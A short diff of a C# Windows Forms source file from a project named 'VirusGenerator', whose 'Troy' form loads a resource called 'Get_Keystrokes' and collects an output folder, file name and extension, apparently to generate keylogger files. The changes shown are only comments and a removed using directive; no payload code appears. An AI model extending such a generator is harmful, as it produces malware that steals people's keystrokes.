@@ -32,13 +32,14 @@ using System.Linq;
 using System.Text;
 using System.Threading.Tasks;
 using System.Windows.Forms;
-using System.Reflection;
 using System.IO;
 
 namespace VirusGenerator
 {
     public partial class Troy : Form
     {
+
+        // Init class level variables
         string getKeys = Properties.Resources.Get_Keystrokes;
 
         string _outputFolder;
@@ -56,8 +57,8 @@ namespace VirusGenerator
         /// <param name="e"></param>
         private void BtnGen_Click(object sender, EventArgs e)
         {
-            // Init variables
-            _outputFolder = @TxtBoxDes.Text;
+            
+            _outputFolder = @TxtBoxDes.Text; //The @ escapes the folder location (i.e C:\\Users\\..)
             _fileName = TxtBoxFileName.Text;
             _fileExt = CBoxFor.Text;
 
